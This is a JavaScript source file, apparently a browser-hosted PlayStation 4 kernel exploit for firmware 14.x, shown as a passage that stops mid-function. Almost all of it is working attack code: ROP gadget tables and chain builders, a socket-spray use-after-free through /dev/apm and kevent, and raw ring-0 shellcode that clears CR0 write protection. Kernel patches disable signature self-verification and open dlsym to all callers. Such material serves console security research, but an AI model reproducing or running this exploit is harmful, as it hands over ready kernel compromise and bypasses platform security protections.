/*
    afterglow -- PlayStation 4 kernel exploit for firmware 14.00
    Port to the raw13 host (WebKit entry), from the Lua original.

    Copyright (C) 2026 well0nez

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import { int64 } from "./int64.js";
import { deriveBaseFromLeak, validateKernelHeader } from "./kernel-format-1402.js";
import { sha256Hex } from "./sha256.js";

const DEBUG_BIN = {
  length: 498720,
  sha256: "5862bf202a7c5f146820fd6354330dd07b1c6bdbe6e7f939ba71692b5410d083",
};
const CANDIDATE_READY = true;

const S = {
  read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
  getuid: 24, kqueue: 362, kevent: 363, mmap: 477, lseek: 478, thr_self: 432,
  getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
  cpuset_setaffinity: 488, dynlib_dlsym: 591,
  dynlib_get_list: 592, dynlib_get_info: 593,
};

/* Firmware 14.02 offsets used only after live byte checks. */
const K = {
  anchor:    0x00e6c30,
  swap_rbp:  0x0a81478,
  prison0:   0x111fa18,
  rootvnode: 0x2136e90,
};

/* offsets into libSceLibcInternal, with the bytes that must be found there */
const GADGETS = {
  pivot:  [0x0d2812, "488b67385fc3"],
  rdi:    [0x0a6bae, "5fc3"],
  rsi:    [0x095560, "5ec3"],
  rdx:    [0x04e6d2, "5ac3"],
  rcx:    [0x0943ee, "59c3"],
  store:  [0x041ceb, "488907c3"],
  load:   [0x0120b1, "488b07c3"],
  load8:  [0x057fae, "488b4008c3"],
  add:    [0x0aaf8b, "4801f8c3"],
  sub:    [0x0275b4, "4829f8c3"],
  shr:    [0x0a9ba2, "48d3e8c3"],
  shl:    [0x0a9b98, "48d3e0c3"],
  memcpy: [0x026ad0, "554889e54889f8"],
  leave:  [0x09e59d, "c9c3"],
};

const HOST = { page: 0x130000, free: 0x130730, last: 0x131000 };

const TUNE = {
  sprays: 126,
  object: 104,
  window: 0x4000,
  entries: 420,
  stride: 0x90,
  seed: 45,
  spare: 8,
  units: 15,
  batch: 60,
  ceiling: 63,
};

const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];

const BOOTSTRAP =
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
  + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
  + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
  + "488991882d1001c781ac2d100101000000c681daae1f0037c681ddae1f00370f"
  + "20c0480d000001000f22c031c0c3";

const PATCH_WINDOWS = [
  [0x0000acd, "76174989ea4983c2", "eb",       "bcopy"],
  [0x02bda9d, "76174989ea4983c2", "eb",       "bzero"],
  [0x02bdae1, "761b4989ea4983c2", "eb",       "pagezero"],
  [0x02bdb5d, "76174989ea4983c2", "eb",       "memcpy"],
  [0x02bdba1, "761b4989ea4983c2", "eb",       "pagecopy"],
  [0x02bdd4d, "76174989ea4983c2", "eb",       "copyin"],
  [0x02be1fd, "76174989ea4983c2", "eb",       "copyinstr"],
  [0x02be2cd, "76174989ea4983c2", "eb",       "copystr"],
  [0x01b7c63, "0f850b020000488b", "eb04",     "dlsym, first check"],
  [0x01b7c73, "0f84fb010000493b", "eb04",     "dlsym, second check"],
  [0x01b7c93, "0f8481010000bf10", "90e9",     "dlsym, nop and jump"],
  [0x01b7724, "0f84c00000004c8d", "90e9",     "load_prx"],
  [0x01b7cd8, "0f8239010000488b", "90e93c01", "dlsym, open it to every caller"],
  [0x0628b04, "74074883c4085b5d", "eb00",     "self verification"],
  [0x06293ef, "7541488d3df87403", "eb00",     "delayed panic on suspend"],
];
const PATCHES = PATCH_WINDOWS.map(function (w) { return [w[0], w[2], w[3]]; });
/* Same-boot stock windows for the bootstrap's 14.02 fixed-address writes. */
const BOOTSTRAP_WINDOWS = [
  [0x00000490, "ffffffff498b8740", "00000000498b8740"],
  [0x000004b5, "721385c9750f483b", "eb0085c9eb00483b"],
  [0x000004b9, "750f483b90f00000", "eb00483b90f00000"],
  [0x000004c2, "7269eb0485c97463", "eb69eb0485c97463"],
  [0x00000ab4, "9090909090909090", "ff26909090909090"],
  [0x001faeda, "3341b23331c04531", "3741b23731c04531"],
  [0x001faedd, "3331c04531f64531", "3731c04531f64531"],
];

const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false,
  pthread: null };

function host() {
  if (!STATE.ctx) throw new Error("afterglow: no host installed");
  return STATE.ctx;
}

function say(fmt) {
  host().mark("AG", fmt);
}

async function checkpoint(name, detail) {
  const run = host().params && host().params.get("run");
  if (!run || !/^[0-9]{8,16}-[0-9]{6,20}$/.test(run)) return false;
  try {
    const url = "beacon?run=" + encodeURIComponent(run) +
      "&tag=" + encodeURIComponent(name) +
      "&detail=" + encodeURIComponent(detail || "");
    const response = await fetch(url, { cache: "no-store" });
    return response.ok;
  } catch (_) { return false; }
}

const LOW = 0x100000000;

function v(low, hi) { return new int64(low >>> 0, (hi || 0) >>> 0); }
function plus(a, n) { return n < 0 ? a.sub32(-n) : a.add32(n); }
function same(a, b) { return !!b && a.low === b.low && a.hi === b.hi; }
function inText(a) { return a.hi >= 0xffffff00 && a.low !== 0; }
function inHeap(a) { return a.hi >= 0xffff0000 && a.hi < 0xffffff00 && a.low !== 0; }
function text(a) { return "0x" + a.toString(16).padStart(16, "0"); }

function seedStubs() {
  const c = host();
  const need = new Set();
  for (const k in S) {
    const n = S[k];
    if (!(c.stubAddr && c.stubAddr.has(n)) && !STATE.stubs[n]) need.add(n);
  }
  if (!need.size) return [];

  const base = c.libkernelBase;
  if (!base) return Array.from(need);

  const limit = (c.off && c.off.k_scan_stage1) || 0x200000;
  for (let o = 0; o < limit && need.size; o += 16) {
    const q = c.p.read8(base.add32(o));
    if ((q.low & 0x00ffffff) !== 0xc0c748 || (q.hi >>> 24) !== 0x49) continue;
    const n = ((q.low >>> 24) | ((q.hi & 0x00ffffff) << 8)) >>> 0;
    if (!need.has(n)) continue;
    STATE.stubs[n] = base.add32(o);
    need.delete(n);
  }
  return Array.from(need);
}

function stubFor(num) {
  const c = host();
  if (STATE.stubs[num]) return STATE.stubs[num];
  if (c.stubAddr && c.stubAddr.has(num)) return c.stubAddr.get(num);
  return null;
}

function sc(num) {
  const a = Array.prototype.slice.call(arguments, 1);
  const t = stubFor(num);
  if (!t) throw new Error("afterglow: no libkernel stub for syscall " + num);
  return host().callAddr(t, a);
}

function alloc(size) {
  const c = host();
  const ab = new ArrayBuffer(size);
  const u8 = new Uint8Array(ab);
  const dv = new DataView(ab);
  c.keepAlive.push(ab, u8, dv);
  return { ab: ab, u8: u8, dv: dv, at: c.bufAddr(ab) };
}

function rd4(at) { return host().p.read4(at) >>> 0; }
function rd8(at) { const r = host().p.read8(at); return v(r.low, r.hi); }
function wr1(at, b) { host().p.write1(at, b & 0xff); }
function wr4(at, n) { host().p.write4(at, n >>> 0); }
function wr8(at, q) { host().p.write8(at, q); }

function rdbuf(at, len) {
  const out = new Uint8Array(len);
  const pr = host().p;
  let i = 0;
  while (i + 8 <= len) {
    const q = pr.read8(plus(at, i));
    let lo = q.low >>> 0, hi = q.hi >>> 0;
    for (let k = 0; k < 4; k++) { out[i + k] = lo & 0xff; lo = lo >>> 8; }
    for (let k = 0; k < 4; k++) { out[i + 4 + k] = hi & 0xff; hi = hi >>> 8; }
    i += 8;
  }
  while (i < len) { out[i] = pr.read1(plus(at, i)) & 0xff; i++; }
  return out;
}

function wrbuf(at, bytes) {
  for (let i = 0; i < bytes.length; i++) wr1(plus(at, i), bytes[i]);
}

function unhex(s) {
  const out = new Uint8Array(s.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(s.substr(i * 2, 2), 16);
  return out;
}

function sameBytes(a, b) {
  if (a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
  return true;
}

function pokeAt(buf, off, q) {
  buf.dv.setUint32(off, q.low >>> 0, true);
  buf.dv.setUint32(off + 4, q.hi >>> 0, true);
}

function wipe(buf, len) { buf.u8.fill(0, 0, len); }

function cstr(s) {
  const b = alloc(s.length + 8);
  for (let i = 0; i < s.length; i++) b.u8[i] = s.charCodeAt(i);
  b.u8[s.length] = 0;
  return b;
}

function splitNum(n) { return v(n % LOW, Math.floor(n / LOW)); }
function asQ(x) { return (typeof x === "number") ? splitNum(x) : x; }

function codeAt(pageAt, off) {
  return {
    at: plus(pageAt, off),
    n: 0,
    reset: function () { this.n = 0; return this; },
    byte: function (b) { wr1(plus(this.at, this.n), b); this.n++; return this; },
    hex: function (s) {
      const b = unhex(s);
      for (let i = 0; i < b.length; i++) this.byte(b[i]);
      return this;
    },
    dw: function (n) {
      for (let k = 0; k < 4; k++) this.byte(Math.floor(n / Math.pow(256, k)) % 256);
      return this;
    },
    qw: function (q) { return this.dw(q.low >>> 0).dw(q.hi >>> 0); },
    imm: function (bytes) {
      for (let i = 0; i < bytes.length; i++) this.byte(bytes[i]);
      return this;
    },
  };
}

function makeChain(buf, gad) {
  return {
    buf: buf, base: buf.at, n: 0, fix: [], g: gad,

    slot: function (q) {
      if ((this.n + 1) * 8 > this.buf.u8.length)
        throw new Error("kernel read chain exceeds its allocated buffer");
      pokeAt(this.buf, this.n * 8, asQ(q)); this.n++; return this.n - 1;
    },
    num: function (n) { return this.slot(asQ(n)); },
    hole: function () { return this.slot(v(0, 0)); },
    where: function (i) { return plus(this.base, i * 8); },
    gad: function (name) { return this.slot(this.g[name]); },
    point: function (hole, target) { this.fix.push([hole, target]); },

    seal: function () {
      for (let i = 0; i < this.fix.length; i++) {
        pokeAt(this.buf, this.fix[i][0] * 8, this.where(this.fix[i][1]));
      }
      this.gad("leave");
    },

    rdi: function (n) { this.gad("rdi"); return this.num(n); },
    rsi: function (n) { this.gad("rsi"); return this.num(n); },
    rdx: function (n) { this.gad("rdx"); return this.num(n); },

    follow: function (off) {
      const d = off - 8;
      if (d >= 0) { this.rdi(d); this.gad("add"); } else { this.rdi(-d); this.gad("sub"); }
      this.gad("load8");
    },

    save_rax: function (at) { this.rdi(at); this.gad("store"); },
    load_rax: function (at) { this.rdi(at); this.gad("load"); },

    grab: function (dst, len) {
      this.gad("rdi"); const h = this.hole();
      this.gad("store");
      this.gad("rsi"); const s = this.hole();
      this.point(h, s);
      this.rdx(len); this.rdi(dst); this.gad("memcpy");
      return s;
    },

    put: function (dst, src, len) {
      this.gad("rdi"); this.slot(dst);
      this.rsi(src); this.rdx(len); this.gad("memcpy");
    },
  };
}

function shooter(gad) {
  const s = {
    g: gad, fired: 0, sprayed: 0, devs: [], queues: [],
    sockaddr: alloc(16),
  };
  const bs = [16, 2, 0x04, 0xD2, 0x0a, 0, 0, 1];
  for (let i = 0; i < bs.length; i++) s.sockaddr.u8[i] = bs[i];

  s.hold = function (path) {
    const fd = sc(S.open, cstr(path).at, 0).i32;
    if (fd >= 0) this.devs.push(fd);
    return fd;
  };

  s.take = function (build, room) {
    this.why = null;
    if (this.fired >= TUNE.units) {
      this.why = "one-shot kernel read budget exhausted";
      return null;
    }
    if (this.hold("/dev/apm") < 0) {
      this.why = "the clone node refused to open, errno " + host().errno();
      return null;
    }

    let unit = -1, watched = -1;
    const refused = [];
    for (let u = TUNE.ceiling; u >= 0; u--) {
      if (STATE.units[u]) continue;
      const fd = this.hold("/dev/apm" + u);
      if (fd >= 0) { unit = u; watched = fd; break; }
      if (refused.length < 4) refused.push(u + ":e" + host().errno());
    }
    if (unit < 0) {
      this.why = "no apm unit among 0.." + TUNE.ceiling
                 + " (" + Object.keys(STATE.units).length + " spent, refusals "
                 + refused.join(" ") + ")";
      return null;
    }
    STATE.units[unit] = true;
    this.fired++;

    const doomed = sc(S.open, cstr("/dev/apm" + unit).at, 0).i32;
    if (doomed < 0) {
      this.why = "second open of /dev/apm" + unit + " refused, errno " + host().errno();
      return null;
    }

    const q = sc(S.kqueue).i32;
    this.queues.push(q);
    const ev = alloc(32);
    const arm = function () {
      ev.dv.setUint32(0, watched >>> 0, true);
      ev.dv.setUint32(4, 0, true);
      ev.dv.setUint16(8, 0xFFFF, true);
      ev.dv.setUint16(10, 0x0001, true);
      ev.dv.setUint32(12, 0, true);
      ev.u8.fill(0, 16, 32);
      return sc(S.kevent, q, ev.at, 1, 0, 0, 0).i32;
    };
    const armed = arm();
    if (armed !== 0) {
      this.why = "kevent would not arm on unit " + unit + ", rv=" + armed
                 + " errno " + host().errno();
      return null;
    }

    const rop = alloc(room || 0x400);
    const frame = alloc(0x100);
    wipe(frame, 0x100);
    const c = makeChain(rop, this.g);
    c.num(0);
    build(c);
    c.seal();
    pokeAt(frame, 0x38, rop.at);

    const body = alloc(TUNE.object);
    wipe(body, TUNE.object);
    pokeAt(body, 0x38, this.g.pivot);
    pokeAt(body, 0x58, frame.at);

    const req = alloc(40);
    req.dv.setUint32(0, 1, true);
    req.dv.setUint32(4, 0, true);
    pokeAt(req, 8, this.sockaddr.at);
    req.dv.setUint32(16, 16, true);
    pokeAt(req, 24, body.at);
    req.dv.setUint32(32, TUNE.object, true);

    const want = TUNE.seed;
    for (let i = 0; i < want; i++) {
      if (this.hold("/dev/apm") < 0) break;
      STATE.clones++;
    }

    const socks = [];
    for (let i = 0; i < TUNE.sprays; i++) {
      const fd = sc(S.socket, 2, 2, 0).i32;
      if (fd < 0) break;
      socks.push(fd);
    }

    const hh = host();
    const stub = stubFor(S.setsockopt);
    
    if (STATE.batch === undefined && hh.prepareMany && stub) {
      STATE.batch = 0;
      for (let n = TUNE.sprays; n >= 8; n = Math.floor(n * 3 / 4)) {
        try {
          const probeCalls = [];
          for (let i = 0; i < n; i++) probeCalls.push([stub, [0, 17, 128, req.at, 40]]);
          hh.prepareMany(probeCalls);
          STATE.batch = n; break;
        } catch (e) { }
      }
      say("    rop stack takes " + STATE.batch + " calls per entry");
    }
    const batch = (hh.prepareMany && hh.runPrepared && stub) ? (STATE.batch || 0) : 0;
    const fertig = [];
    if (batch) {
      const calls = [];
      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
      for (let i = 0; i < calls.length; i += batch) {
        fertig.push(hh.prepareMany(calls.slice(i, i + batch)));
      }
      hh.runPrepared(hh.prepareMany([[stubFor(S.getuid), []]]));
    }

    const t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
    sc(S.close, doomed);
    if (batch) {
      for (let i = 0; i < fertig.length; i++) hh.runPrepared(fertig[i]);
    } else {
      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
    }
    const t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
    this.window = t1 - t0;
    this.batched = batch;
    for (let i = 0; i < TUNE.spare; i++) this.hold("/dev/apm");

    this.sprayed = socks.length;
    const r = arm();
    for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
    say("    window " + this.window.toFixed(2) + " ms for " + socks.length
        + " setsockopt in " + (this.batched ? fertig.length : socks.length) + " entries");
    return r;
  };

  return s;
}

function ran(r) { return r !== null && r === -1; }

function qAt(buf, off) {
  return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
}

/* Break the original merged r2 into bounded reads. Each returned pointer is
   checked in JavaScript before the next kernel read or the first write. */
async function captureHostState(shot, kbase, probe, reach, hostPage) {
  const fire = async function (stage, build, room) {
    if (!await checkpoint(stage + "-armed", "bounded kernel read"))
      throw new Error(stage + ": PC collector did not acknowledge the shot");
    const result = shot.take(build, room || 0x400);
    if (!ran(result)) throw new Error(stage + ": kernel read shot missed: " + shot.why);
    say("[3] " + stage + " returned");
  };
  try {
    if (reach < 2 || reach > 192 || probe < 0 || probe > 0xffff)
      throw new Error("map reach or probe fd exceeds the bounded plan");
    const tidOut = alloc(8); wipe(tidOut, 8);
    const tidRv = sc(S.thr_self, tidOut.at).i32;
    const userTid = tidOut.dv.getInt32(0, true);
    const userPid = sc(S.getpid).i32;
    if (tidRv !== 0 || userTid <= 0 || userPid <= 0 ||
        tidOut.dv.getUint32(4, true) !== 0)
      throw new Error("thread or process ID syscall failed");

    const savedRbp = alloc(8), threadOut = alloc(8);
    wipe(savedRbp, 8); wipe(threadOut, 8);
    await fire("thread", function (c) {
      c.slot(plus(kbase, K.swap_rbp)); c.save_rax(savedRbp.at);
      c.slot(plus(kbase, K.swap_rbp));
      c.slot(plus(kbase, 0x74de23)); c.num(0);
      c.save_rax(threadOut.at);
      c.load_rax(savedRbp.at); c.slot(plus(kbase, K.swap_rbp));
      if (c.n !== 15) throw new Error("GS thread chain changed length");
    });
    const thread = qAt(threadOut, 0), oldRbp = qAt(savedRbp, 0);
    if (!inHeap(thread) || (thread.low & 7) !== 0 ||
        oldRbp.hi < 0xffff0000 || oldRbp.low === 0 || (oldRbp.low & 7) !== 0)
      throw new Error("GS thread or saved RBP was implausible");

    const procRef = alloc(16), tidRef = alloc(16);
    const procOut = alloc(8), kernelTidOut = alloc(4);
    pokeAt(procRef, 0, plus(thread, 8));
    pokeAt(tidRef, 0, plus(thread, 0x88));
    wipe(procOut, 8); wipe(kernelTidOut, 4);
    await fire("proc", function (c) {
      c.load_rax(procRef.at); c.grab(procOut.at, 8);
      c.load_rax(tidRef.at); c.grab(kernelTidOut.at, 4);
    });
    const proc = qAt(procOut, 0);
    if (!inHeap(proc) || (proc.low & 7) !== 0 ||
        kernelTidOut.dv.getInt32(0, true) !== userTid)
      throw new Error("thread proc or TID did not match this browser thread");

    const pidRef = alloc(16), fdRef = alloc(16), vmRef = alloc(16);
    const pidOut = alloc(4), fdOut = alloc(8), vmOut = alloc(8);
    pokeAt(pidRef, 0, plus(proc, 0xb0));
    pokeAt(fdRef, 0, plus(proc, 0x48));
    pokeAt(vmRef, 0, plus(proc, 0x168));
    wipe(pidOut, 4); wipe(fdOut, 8); wipe(vmOut, 8);
    await fire("proc-fields", function (c) {
      c.load_rax(pidRef.at); c.grab(pidOut.at, 4);
      c.load_rax(fdRef.at); c.grab(fdOut.at, 8);
      c.load_rax(vmRef.at); c.grab(vmOut.at, 8);
    });
    const filedesc = qAt(fdOut, 0), vmspace = qAt(vmOut, 0);
    if (pidOut.dv.getInt32(0, true) !== userPid ||
        !inHeap(filedesc) || !inHeap(vmspace) ||
        (filedesc.low & 7) !== 0 || (vmspace.low & 7) !== 0)
      throw new Error("process ID, filedesc or vmspace failed validation");

    const fdHeaderRef = alloc(16), fdHeader = alloc(0x40);
    pokeAt(fdHeaderRef, 0, filedesc); wipe(fdHeader, 0x40);
    await fire("fd-header", function (c) {
      c.load_rax(fdHeaderRef.at); c.grab(fdHeader.at, 0x40);
    });
    const ofiles = qAt(fdHeader, 0);
    const capacity = fdHeader.dv.getInt32(0x28, true);
    const lastfile = fdHeader.dv.getInt32(0x38, true);
    if (!inHeap(ofiles) || (ofiles.low & 7) !== 0 ||
        capacity <= 0 || capacity > 0x10000 ||
        lastfile < probe || lastfile >= capacity || capacity - lastfile < 200)
      throw new Error("filedesc header or FD headroom failed validation");

    /* Re-read fd_ofiles inside the shot that follows the probe descriptor.
       A prior snapshot is used only as a comparison, never as a live source. */
    const freshOfilesOut = alloc(8), fileOut = alloc(8);
    wipe(freshOfilesOut, 8); wipe(fileOut, 8);
    await fire("file", function (c) {
      c.load_rax(fdHeaderRef.at); c.follow(0);
      c.save_rax(freshOfilesOut.at);
      c.follow(probe * 8); c.save_rax(fileOut.at);
    });
    const freshOfiles = qAt(freshOfilesOut, 0), file = qAt(fileOut, 0);
    if (!same(ofiles, freshOfiles) || !inHeap(file) || (file.low & 7) !== 0)
      throw new Error("probe file or live fd_ofiles changed across shots");

    const opsRef = alloc(16), opsOut = alloc(8);
    pokeAt(opsRef, 0, plus(file, 8)); wipe(opsOut, 8);
    await fire("file-ops", function (c) {
      c.load_rax(opsRef.at); c.grab(opsOut.at, 8);
    });
    const ops = qAt(opsOut, 0);
    if (!inText(ops) || (ops.low & 7) !== 0)
      throw new Error("probe file operation table pointer was implausible");
    const ftab = alloc(0x100), tableRef = alloc(16);
    const mapHeadRef = alloc(16), mapHeadOut = alloc(8);
    wipe(ftab, 0x100); pokeAt(tableRef, 0, ops);
    pokeAt(mapHeadRef, 0, plus(vmspace, 8)); wipe(mapHeadOut, 8);
    await fire("ops-and-map-head", function (c) {
      c.load_rax(tableRef.at); c.grab(ftab.at, 0x58);
      c.load_rax(mapHeadRef.at); c.grab(mapHeadOut.at, 8);
    });
    let sane = 0;
    for (let i = 0; i < 10; i++) if (inText(qAt(ftab, i * 8))) sane++;
    if (sane < 6) throw new Error("operation table has too few kernel pointers");

    let entry = qAt(mapHeadOut, 0);
    if (!inHeap(entry) || (entry.low & 7) !== 0)
      throw new Error("vmspace map head was implausible");

    const maps = alloc(reach * TUNE.stride + 0x100);
    wipe(maps, reach * TUNE.stride);
    const addresses = [];
    let hit = null;
    for (let first = 0; first < reach && hit === null; first += 48) {
      const count = Math.min(48, reach - first);
      const entryRef = alloc(16), nextOut = alloc(8);
      pokeAt(entryRef, 0, entry); wipe(nextOut, 8);
      await fire("map-" + first, function (c) {
        c.load_rax(entryRef.at);
        for (let i = 0; i < count; i++) {
          const source = c.grab(plus(maps.at, (first + i) * TUNE.stride), TUNE.stride);
          c.load_rax(c.where(source)); c.gad("load8");
        }
        c.save_rax(nextOut.at);
      }, 0x2000);
      for (let i = 0; i < count; i++) {
        const at = (first + i) * TUNE.stride;
        if (!inHeap(entry) || (entry.low & 7) !== 0)
          throw new Error("map link was not a kernel heap pointer");
        addresses[first + i] = entry;
        const from = qAt(maps, at + 0x20), upto = qAt(maps, at + 0x28);
        const next = qAt(maps, at + 8);
        if (next.low === entry.low && next.hi === entry.hi)
          throw new Error("map list looped on itself");
        if (upto.hi - from.hi <= 0x100) {
          const above = from.hi < hostPage.hi ||
            (from.hi === hostPage.hi && from.low <= hostPage.low);
          const below = hostPage.hi < upto.hi ||
            (hostPage.hi === upto.hi && hostPage.low < upto.low);
          if (above && below && hit === null) hit = first + i;
        }
        entry = next;
      }
      if (!same(entry, qAt(nextOut, 0)))
        throw new Error("map walk continuation did not match copied links");
    }
    if (hit === null) throw new Error("no validated mapping covers the host page");
    say("[3] validated file, operation table and host-page map entry " + hit);
    return { file, ops, ftab, maps, hit, here: addresses[hit] };
  } catch (error) {
    say("[3] bounded kernel read stopped: " + ((error && error.message) || error));
    say("[3] no kernel write from this stage; cold power off before another attempt");
    return null;
  }
}

const GATE = 0x0a0, BODY = 0x0c0, OUT = 0x400, FLAG = 0x420, STAGE = 0x440;
const STAGE_MAX = 0x400;
const SIGIL = 0x600D600D;

function openRing0(roomAt) {
  const r = { at: roomAt, body: codeAt(roomAt, BODY) };
  codeAt(roomAt, GATE).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");

  r.begin = function () { return this.body.reset(); };

  r.run = function () {
    this.body.hex("48b8").qw(plus(this.at, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
    wr4(plus(this.at, FLAG), 0);
    host().callAddr(plus(this.at, GATE), [11, plus(this.at, BODY)]);
    return (rd4(plus(this.at, FLAG)) >>> 0) === (SIGIL >>> 0);
  };

  r.out = function () { return rd8(plus(this.at, OUT)); };

  r.thread = function () {
    this.begin().hex("48ba").qw(plus(this.at, OUT)).hex("48893a");
    return this.run() ? this.out() : null;
  };

  r.base = function () {
    const c = this.begin();
    c.hex("b9").dw(0xc0000082).hex("0f32");
    c.hex("48c1e220").hex("89c0").hex("4809c2");
    c.hex("48b8").qw(plus(this.at, OUT)).hex("488910");
    return this.run() ? plus(this.out(), -0x1c0) : null;
  };

  r.copy = function (dst, src, len, guarded) {
    const c = this.begin();
    if (guarded) c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    c.hex("48bf").qw(dst);
    c.hex("48be").qw(src);
    c.hex("48b9").qw(splitNum(len));
    c.hex("fc").hex("f3a4");
    if (guarded) c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };

  r.apply = function (base, list) {
    const c = this.begin();
    c.hex("48b9").qw(base);
    c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    for (let i = 0; i < list.length; i++) {
      const bytes = unhex(list[i][1]);
      if (bytes.length === 1) c.hex("c681");
      else if (bytes.length === 2) c.hex("66c781");
      else c.hex("c781");
      c.dw(list[i][0]).imm(bytes);
    }
    c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };

  r.read = function (at, len) {
    len = len || 8;
    if (!this.copy(plus(this.at, STAGE), at, len, false)) return null;
    return rdbuf(plus(this.at, STAGE), len);
  };

  r.read_v = function (at) {
    const s = this.read(at, 8);
    if (!s) return null;
    let lo = 0, hi = 0;
    for (let i = 3; i >= 0; i--) lo = lo * 256 + s[i];
    for (let i = 7; i >= 4; i--) hi = hi * 256 + s[i];
    return v(lo, hi);
  };

  r.write = function (at, bytes) {
    wrbuf(plus(this.at, STAGE), bytes);
    return this.copy(at, plus(this.at, STAGE), bytes.length, true);
  };

  r.write_v = function (at, q) {
    const b = new Uint8Array(8);
    let lo = q.low >>> 0, hi = q.hi >>> 0;
    for (let i = 0; i < 4; i++) { b[i] = lo % 256; lo = Math.floor(lo / 256); }
    for (let i = 4; i < 8; i++) { b[i] = hi % 256; hi = Math.floor(hi / 256); }
    return this.write(at, b);
  };

  return r;
}

function isZero(q) { return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0); }

let MAPS = null;

function findLibByShape() {
  const r = { base: null, entries: 0, big: 0, first: [], note: null };
  MAPS = [];
  const pid = sc(S.getpid).i32;
  const mib = alloc(16);
  mib.dv.setInt32(0, 1, true); mib.dv.setInt32(4, 14, true);
  mib.dv.setInt32(8, 32, true); mib.dv.setInt32(12, pid, true);
  const len = alloc(8);
  len.dv.setUint32(0, 0, true); len.dv.setUint32(4, 0, true);
  let rv = sc(S.sysctl, mib.at, 4, 0, len.at, 0, 0).i32;
  let need = len.dv.getUint32(0, true);
  if (rv !== 0 || !need) { r.note = "vmmap sizing rv=" + rv; return r; }
  const buf = alloc(need + 0x8000);
  len.dv.setUint32(0, need + 0x8000, true); len.dv.setUint32(4, 0, true);
  rv = sc(S.sysctl, mib.at, 4, buf.at, len.at, 0, 0).i32;
  const used = Math.min(len.dv.getUint32(0, true), buf.u8.length);
  if (rv !== 0 || !used) { r.note = "vmmap read rv=" + rv; return r; }

  const span = HOST.last;
  const cand = [];
  let off = 0;
  while (off + 8 <= used) {
    const size = buf.dv.getInt32(off, true);
    if (size <= 0 || off + size > used) break;
    r.entries++;
    const start = qAt(buf, off + 8), stop = qAt(buf, off + 16);
    MAPS.push([start, stop]);
    if (r.first.length < 4) r.first.push(text(start) + "-" + text(stop));
    const bytes = (stop.hi - start.hi) * LOW + (stop.low - start.low);
    if (start.hi > 0 && (start.low & 0x3fff) === 0 && bytes >= span) {
      cand.push(start); r.big++;
    }
    off += size;
  }

  const probes = [GADGETS.pivot, GADGETS.memcpy];
  for (let i = 0; i < cand.length; i++) {
    let all = true;
    for (let k = 0; k < probes.length && all; k++) {
      const want = unhex(probes[k][1]);
      if (!sameBytes(rdbuf(plus(cand[i], probes[k][0]), want.length), want)) all = false;
    }
    if (all) { r.base = cand[i]; return r; }
  }
  r.note = "no mapping carries the gadget shape (" + r.big + " of " + r.entries + " long enough)";
  return r;
}

function findLib(name) {
  const r = { base: null, rv: null, count: 0, seen: [], note: null };
  const list = alloc(4 * 0x300), count = alloc(8);
  count.dv.setUint32(0, 0, true); count.dv.setUint32(4, 0, true);
  r.rv = sc(S.dynlib_get_list, list.at, 0x300, count.at).i32;
  r.count = count.dv.getUint32(0, true);
  if (r.rv !== 0) { r.note = "dynlib_get_list rv=" + r.rv; return r; }
  if (!r.count) { r.note = "the module list came back empty"; return r; }

  const info = alloc(0x160);
  for (let i = 0; i < r.count; i++) {
    info.u8.fill(0);
    info.dv.setUint32(0, 0x160, true);
    const rv = sc(S.dynlib_get_info, list.dv.getUint32(i * 4, true), info.at).i32;
    if (rv !== 0) continue;
    let nm = "";
    for (let k = 8; k < 0x100 && info.u8[k] !== 0; k++) nm += String.fromCharCode(info.u8[k]);
    if (r.seen.length < 6) r.seen.push(nm);
    if (nm === name) {
      let b = qAt(info, 0x108);
      if (!isZero(b)) { r.base = b; r.at = "0x108"; return r; }
      const cand = [];
      for (let o = 8; o + 8 <= 0x160; o += 8) {
        const q = qAt(info, o);
        if (isZero(q)) continue;
        if (q.hi > 0x40) continue;
        if ((q.low & 0x3fff) !== 0) continue;
        cand.push("+0x" + o.toString(16) + "=" + text(q));
        if (r.base === null) { r.base = q; r.at = "+0x" + o.toString(16); }
      }
      r.note = cand.length
        ? ("base not at +0x108; grid aligned candidates: " + cand.join(" "))
        : "found " + name + " but no plausible base anywhere in the info struct";
      return r;
    }
  }
  r.note = name + " is not among the " + r.count + " modules";
  return r;
}

function pinCore() {
  const mask = alloc(16);
  mask.u8.fill(0);
  let rv = sc(S.cpuset_getaffinity, 3, 1, -1, 16, mask.at).i32;
  if (rv !== 0) return { ok: false, note: "getaffinity rv=" + rv };

  let core = -1, allowed = [];
  for (let b = 0; b < 128; b++) {
    if ((mask.u8[b >> 3] >> (b & 7)) & 1) { if (core < 0) core = b; allowed.push(b); }
  }
  if (core < 0) return { ok: false, note: "no core in the mask" };

